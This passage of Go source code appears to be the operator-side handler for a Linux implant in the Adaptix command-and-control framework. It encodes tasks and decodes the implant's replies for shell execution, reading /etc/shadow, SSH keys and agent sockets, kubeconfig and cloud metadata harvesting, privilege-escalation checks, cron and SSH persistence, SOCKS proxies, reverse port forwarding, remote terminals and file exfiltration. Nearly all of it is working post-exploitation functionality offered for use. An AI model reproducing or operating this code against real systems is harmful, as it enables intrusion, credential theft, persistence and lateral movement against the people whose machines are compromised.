		cmd = Command{Code: CMD_ENV}
	case "network":
		cmd = Command{Code: CMD_NETWORK}
	case "users":
		cmd = Command{Code: CMD_USERS}
	case "cron":
		cmd = Command{Code: CMD_CRON}
	case "sshkeys":
		cmd = Command{Code: CMD_SSH_KEYS}
	case "history":
		cmd = Command{Code: CMD_HISTORY}
	case "docker":
		cmd = Command{Code: CMD_DOCKER}
	case "services":
		cmd = Command{Code: CMD_SERVICES}
	case "privesc":
		cmd = Command{Code: CMD_PRIVESC}
	case "mounts":
		cmd = Command{Code: CMD_MOUNTS}
	case "persist_cron":
		program, e := getStringArg(args, "program")
		err = e
		b, _ := msgpack.Marshal(ParamsShell{Program: program})
		cmd = Command{Code: CMD_PERSIST_CRON, Data: b}
	case "persist_ssh":
		program, e := getStringArg(args, "program")
		err = e
		b, _ := msgpack.Marshal(ParamsShell{Program: program})
		cmd = Command{Code: CMD_PERSIST_SSH, Data: b}
	case "getuid":
		cmd = Command{Code: CMD_GETUID}
	case "filesearch":
		program, e := getStringArg(args, "program")
		err = e
		b, _ := msgpack.Marshal(ParamsShell{Program: program})
		cmd = Command{Code: CMD_FILESEARCH, Data: b}
	case "sshagent":
		cmd = Command{Code: CMD_SSHAGENT}
	case "kubeconfig":
		cmd = Command{Code: CMD_KUBECONFIG}
	case "cloudmeta":
		cmd = Command{Code: CMD_CLOUDMETA}
	case "whoami":
		cmd = Command{Code: CMD_WHOAMI}
	case "hostname":
		cmd = Command{Code: CMD_HOSTNAME}
	case "lsof":
		cmd = Command{Code: CMD_LSOF}
	case "iptables":
		cmd = Command{Code: CMD_IPTABLES}
	case "last":
		cmd = Command{Code: CMD_LAST}
	case "shadow":
		cmd = Command{Code: CMD_SHADOW}
	case "sleep":
		sleepStr, e1 := getStringArg(args, "sleep")
		jitterStr, _ := getStringArg(args, "jitter")
		err = e1
		var sleepInt int
		if s2, e2 := strconv.Atoi(sleepStr); e2 == nil {
			sleepInt = s2
		} else if d, e3 := time.ParseDuration(sleepStr); e3 == nil {
			sleepInt = int(d.Seconds())
		} else {
			err = errors.New("sleep must be seconds or Go duration (e.g. 10 or 10s)")
		}
		jit := 0
		if jitterStr != "" {
			if j, e4 := strconv.Atoi(jitterStr); e4 == nil && j >= 0 && j <= 100 {
				jit = j
			} else if err == nil {
				err = errors.New("jitter must be 0-100")
			}
		}
		b, _ := msgpack.Marshal(ParamsSleep{SleepSeconds: sleepInt, Jitter: jit})
		cmd = Command{Code: CMD_SLEEP, Data: b}
	case "socks":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL
		taskData.Completed = true
		portF, e := getFloatArg(args, "port")
		if e != nil || portF < 1 || portF > 65535 {
			err = errors.New("port must be from 1 to 65535")
			break
		}
		port := int(portF)
		if subcommand == "start" {
			addr, e := getStringArg(args, "address")
			if e != nil {
				err = e
				break
			}
			var tunnelId string
			if getBoolArg(args, "-socks4") {
				tunnelId, err = Ts.TsTunnelCreateSocks4(agentData.Id, "", addr, port)
				if err != nil {
					break
				}
				taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
				if err != nil {
					break
				}
				taskData.Message = fmt.Sprintf("Socks4 server running on port %d", port)
			} else {
				auth := getBoolArg(args, "-auth")
				username := ""
				password := ""
				if auth {
					username, err = getStringArg(args, "username")
					if err != nil {
						break
					}
					password, err = getStringArg(args, "password")
					if err != nil {
						break
					}
				}
				tunnelId, err = Ts.TsTunnelCreateSocks5(agentData.Id, "", addr, port, auth, username, password)
				if err != nil {
					break
				}
				taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
				if err != nil {
					break
				}
				taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
			}
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"
		} else if subcommand == "stop" {
			Ts.TsTunnelStopSocks(agentData.Id, port)
			taskData.Message = "Socks server stopped"
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
		}

	case "lportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL
		taskData.Completed = true
		portF, e := getFloatArg(args, "lport")
		if e != nil || portF < 1 || portF > 65535 {
			err = errors.New("lport must be from 1 to 65535")
			break
		}
		lport := int(portF)
		if subcommand == "start" {
			lhost, e1 := getStringArg(args, "lhost")
			fwdhost, e2 := getStringArg(args, "fwdhost")
			fwdportF, e3 := getFloatArg(args, "fwdport")
			if e1 != nil {
				err = e1
			} else if e2 != nil {
				err = e2
			} else if e3 != nil {
				err = e3
			} else if fwdportF < 1 || fwdportF > 65535 {
				err = errors.New("fwdport must be from 1 to 65535")
			}
			if err != nil {
				break
			}
			tunnelId, cerr := Ts.TsTunnelCreateLportfwd(agentData.Id, "", lhost, lport, fwdhost, int(fwdportF))
			if cerr != nil {
				err = cerr
				break
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				break
			}
			taskData.Message = fmt.Sprintf("Local port forwarding on port %d", lport)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
		} else if subcommand == "stop" {
			Ts.TsTunnelStopLportfwd(agentData.Id, lport)
			taskData.Message = "Local port forwarding stopped"
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
		}

	case "rportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL
		taskData.Completed = true
		portF, e := getFloatArg(args, "lport")
		if e != nil || portF < 1 || portF > 65535 {
			err = errors.New("lport must be from 1 to 65535")
			break
		}
		lport := int(portF)
		if subcommand == "start" {
			fwdhost, e1 := getStringArg(args, "fwdhost")
			fwdportF, e2 := getFloatArg(args, "fwdport")
			if e1 != nil {
				err = e1
			} else if e2 != nil {
				err = e2
			} else if fwdportF < 1 || fwdportF > 65535 {
				err = errors.New("fwdport must be from 1 to 65535")
			}
			if err != nil {
				break
			}
			tunnelId, cerr := Ts.TsTunnelCreateRportfwd(agentData.Id, "", lport, fwdhost, int(fwdportF))
			if cerr != nil {
				err = cerr
				break
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				break
			}
			taskData.Message = fmt.Sprintf("Remote port forwarding on port %d", lport)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
		} else if subcommand == "stop" {
			Ts.TsTunnelStopRportfwd(agentData.Id, lport)
			taskData.Message = "Remote port forwarding stopped"
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
		}

	default:
		return taskData, messageData, errors.New("unknown command")
	}

	if err != nil {
		return taskData, messageData, err
	}

	taskData.Data, _ = msgpack.Marshal(cmd)
	return taskData, messageData, nil
}

func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var inMessage Message
	if err := msgpack.Unmarshal(decryptedData, &inMessage); err != nil {
		return err
	}

	if inMessage.Type != 1 {
		return nil
	}

	for _, objData := range inMessage.Object {
		var command Command
		if err := msgpack.Unmarshal(objData, &command); err != nil {
			continue
		}

		taskData := adaptix.TaskData{
			TaskId:      fmt.Sprintf("%08x", command.Id),
			Completed:   true,
			MessageType: adaptix.MESSAGE_SUCCESS,
		}

		switch command.Code {
		case CMD_PWD:
			var p AnsPwd
			_ = msgpack.Unmarshal(command.Data, &p)
			taskData.Message = "Current directory: " + p.Path

		case CMD_CD:
			var p AnsPwd
			_ = msgpack.Unmarshal(command.Data, &p)
			taskData.Message = "Changed directory to: " + p.Path

		case CMD_SHELL:
			var p AnsShell
			_ = msgpack.Unmarshal(command.Data, &p)
			taskData.Message = "Command executed"
			taskData.ClearText = p.Output

		case CMD_LS:
			var p AnsLs
			_ = msgpack.Unmarshal(command.Data, &p)
			if p.Result {
				var files []FileInfo
				_ = msgpack.Unmarshal(p.Files, &files)
				unixFiles := make([]adaptix.ListingFileDataUnix, 0, len(files))
				for _, f := range files {
					unixFiles = append(unixFiles, adaptix.ListingFileDataUnix{
						IsDir: f.IsDir, Mode: f.Mode, User: f.User, Group: f.Group,
						Size: f.Size, Date: f.Date, Filename: f.Filename,
					})
				}
				Ts.TsClientGuiFilesUnix(taskData, p.Path, unixFiles)
				var b strings.Builder
				for _, f := range unixFiles {
					dir := "d"
					if !f.IsDir {
						dir = "-"
					}
					fmt.Fprintf(&b, "%s %-8s %-8s %10d %s %s\n", dir, f.User, f.Group, f.Size, f.Date, f.Filename)
				}
				taskData.Message = "Directory listing: " + p.Path
				taskData.ClearText = b.String()
			} else {
				taskData.Message = "Error: " + p.Status
				taskData.MessageType = adaptix.MESSAGE_ERROR
			}

		case CMD_PS:
			var p AnsPs
			_ = msgpack.Unmarshal(command.Data, &p)
			if p.Result {
				var procs []PsInfo
				_ = msgpack.Unmarshal(p.Processes, &procs)
				unixProcs := make([]adaptix.ListingProcessDataUnix, 0, len(procs))
				for _, pr := range procs {
					unixProcs = append(unixProcs, adaptix.ListingProcessDataUnix{
						Pid: uint(pr.Pid), Ppid: uint(pr.Ppid), TTY: pr.Tty, Context: pr.Context, ProcessName: pr.Process,
					})
				}
				Ts.TsClientGuiProcessUnix(taskData, unixProcs)
				var b strings.Builder
				b.WriteString(fmt.Sprintf("%-8s %-8s %-8s %-10s %s\n", "PID", "PPID", "TTY", "USER", "COMMAND"))
				for _, pr := range unixProcs {
					b.WriteString(fmt.Sprintf("%-8d %-8d %-8s %-10s %s\n", pr.Pid, pr.Ppid, pr.TTY, pr.Context, pr.ProcessName))
				}
				taskData.Message = "Process list"
				taskData.ClearText = b.String()
			} else {
				taskData.Message = "Error: " + p.Status
				taskData.MessageType = adaptix.MESSAGE_ERROR
			}

		case CMD_CAT:
			var p AnsCat
			_ = msgpack.Unmarshal(command.Data, &p)
			taskData.Message = fmt.Sprintf("File '%s' read", p.Path)
			taskData.ClearText = string(p.Content)

		case CMD_DOWNLOAD:
			var p AnsDownload
			_ = msgpack.Unmarshal(command.Data, &p)
			fileId := fmt.Sprintf("%08x", p.FileId)
			taskData.Completed = p.Finish
			if p.Start {
				_ = Ts.TsDownloadAdd(agentData.Id, fileId, p.Path, int64(p.Size))
				if !p.Finish {
					taskData.Message = "Download started: " + p.Path
				}
			} else if !p.Finish {
				taskData.Message = "Downloading: " + p.Path
			}
			Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_RUNNING, p.Content)
			if p.Finish {
				if p.Canceled {
					Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_CANCELED)
					taskData.Message = "Download canceled: " + p.Path
				} else {
					Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_FINISHED)
					taskData.Message = "Download complete: " + p.Path
				}
			}

		case CMD_UPLOAD:
			var p AnsUpload
			_ = msgpack.Unmarshal(command.Data, &p)
			taskData.Message = "File uploaded: " + p.Path

		case CMD_SCREENSHOT:
			var p AnsScreenshots
			_ = msgpack.Unmarshal(command.Data, &p)
			for i, sc := range p.Screens {
				Ts.TsScreenshotAdd(agentData.Id, fmt.Sprintf("Screenshot %d", i), sc)
			}
			taskData.Message = "Screenshot captured"

		case CMD_ZIP:
			var p AnsZip
			_ = msgpack.Unmarshal(command.Data, &p)
			taskData.Message = "Archive created: " + p.Path

		case CMD_RUN:
			var p AnsRun
			_ = msgpack.Unmarshal(command.Data, &p)
			taskData.Message = fmt.Sprintf("Process executed with pid %d", p.Pid)
			taskData.ClearText = p.Stdout
			if p.Stderr != "" {
				taskData.ClearText += "\n--- [stderr] ---\n" + p.Stderr
			}
			taskData.Completed = p.Finish

		case CMD_SYSINFO, CMD_ENV, CMD_NETWORK, CMD_USERS, CMD_CRON, CMD_SSH_KEYS, CMD_HISTORY, CMD_DOCKER, CMD_SERVICES, CMD_PRIVESC, CMD_MOUNTS, CMD_PERSIST_CRON, CMD_PERSIST_SSH, CMD_GETUID, CMD_FILESEARCH, CMD_SSHAGENT, CMD_KUBECONFIG, CMD_CLOUDMETA, CMD_SLEEP, CMD_WHOAMI, CMD_HOSTNAME, CMD_LSOF, CMD_IPTABLES, CMD_LAST, CMD_SHADOW:
			var p AnsGeneric
			_ = msgpack.Unmarshal(command.Data, &p)
			taskData.Message = "Command executed"
			taskData.ClearText = p.Output

		case CMD_MKDIR:
			taskData.Message = "Directory created"
		case CMD_RM:
			taskData.Message = "File/directory removed"
		case CMD_CP:
			taskData.Message = "Copy completed"
		case CMD_MV:
			taskData.Message = "Move completed"
		case CMD_KILL:
			taskData.Message = "Process killed"

		case CMD_TUNNEL_START, CMD_TUNNEL_START_UDP:
			var p AnsTunnelStart
			_ = msgpack.Unmarshal(command.Data, &p)
			channelId := int(command.Id)
			if p.Result == 0 {
				Ts.TsTunnelConnectionResume(agentData.Id, channelId, false)
			} else if p.Result == 1 {
				Ts.TsTunnelConnectionClose(channelId, true)
			} else {
				Ts.TsTunnelConnectionHalt(channelId, adaptix.SOCKS5_HOST_UNREACHABLE)
			}

		case CMD_TUNNEL_WRITE, CMD_TUNNEL_WRITE_UDP:
			var p ParamsTunnelWrite
			_ = msgpack.Unmarshal(command.Data, &p)
			if p.ChannelId != 0 {
				Ts.TsTunnelConnectionData(p.ChannelId, p.Data)
			}

		case CMD_TUNNEL_CLOSE:
			var p ParamsTunnelStop
			_ = msgpack.Unmarshal(command.Data, &p)
			if p.ChannelId != 0 {
				Ts.TsTunnelConnectionClose(p.ChannelId, false)
			}

		case CMD_TUNNEL_ACCEPT:
			var p ParamsTunnelAccept
			_ = msgpack.Unmarshal(command.Data, &p)
			if p.ChannelId != 0 {
				Ts.TsTunnelConnectionAccept(p.TunnelId, p.ChannelId)
			}

		case CMD_TUNNEL_REVERSE:
			var p AnsTunnelStart
			_ = msgpack.Unmarshal(command.Data, &p)
			tunnelId := int(command.Id)
			taskId, msg, terr := Ts.TsTunnelUpdateRportfwd(tunnelId, p.Result != 0)
			if terr != nil {
				taskData.Message = "Error: " + terr.Error()
				taskData.MessageType = adaptix.MESSAGE_ERROR
			} else {
				taskData.TaskId = taskId
				taskData.Message = msg
				taskData.MessageType = adaptix.MESSAGE_SUCCESS
			}

		case CMD_TERMINAL_START:
			Ts.TsTerminalConnResume(agentData.Id, fmt.Sprintf("%08x", command.Id), false)

		case CMD_TERMINAL_WRITE:
			var p ParamsTerminalWrite
			_ = msgpack.Unmarshal(command.Data, &p)
			if p.TermId != 0 {
				Ts.TsTerminalConnData(fmt.Sprintf("%08x", p.TermId), p.Data)
			}

		case CMD_TERMINAL_STOP:
			var p ParamsTerminalStop
			_ = msgpack.Unmarshal(command.Data, &p)
			if p.TermId != 0 {
				_ = Ts.TsTerminalConnClose(fmt.Sprintf("%08x", p.TermId), "Terminal stopped")
			}

		case CMD_EXIT:
			taskData.Message = "The agent has completed its work (kill process)"
			_ = Ts.TsAgentTerminate(agentData.Id, taskData.TaskId)

		case CMD_ERROR:
			var p AnsError
			_ = msgpack.Unmarshal(command.Data, &p)
			taskData.Message = "Error: " + p.Error
			taskData.MessageType = adaptix.MESSAGE_ERROR

		default:
			continue
		}

		Ts.TsTaskUpdate(agentData.Id, taskData)
	}

	return nil
}

func splitShellArgs(s string) []string {
	var args []string
	var b strings.Builder
	var quote rune
	escaped := false
	flush := func() {
		if b.Len() > 0 {
			args = append(args, b.String())
			b.Reset()
		}
	}
	for _, r := range s {
		if escaped {
			b.WriteRune(r)
			escaped = false
			continue
		}
		switch {
		case r == '\\' && quote != '\'':
			escaped = true
		case quote != 0:
			if r == quote {
				quote = 0
			} else {
				b.WriteRune(r)
			}
		case r == '\'' || r == '"':
			quote = r
		case r == ' ' || r == '\t':
			flush()
		default:
			b.WriteRune(r)
		}
	}
	if escaped {
		b.WriteRune('\\')
	}
	flush()

	// When invoking a shell with -c, the command string must be a single argv
	// element after -c. The UI passes args as a command-line-style string, so
	// `-c echo HELLO123` would otherwise become ["-c","echo","HELLO123"], which
	// makes /bin/sh treat "echo" as the command and "HELLO123" as $0, returning
	// only an empty line. Keep the rest of the string together in that case.
	if len(args) > 2 && (args[0] == "-c" || args[0] == "--command") {
		joined := strings.Join(args[1:], " ")
		args = []string{args[0], joined}
	}

	return args
}

var _ = binary.BigEndian
var _ = hex.EncodeToString
var _ = time.Now
var _ = bytes.NewBuffer

func main() {}
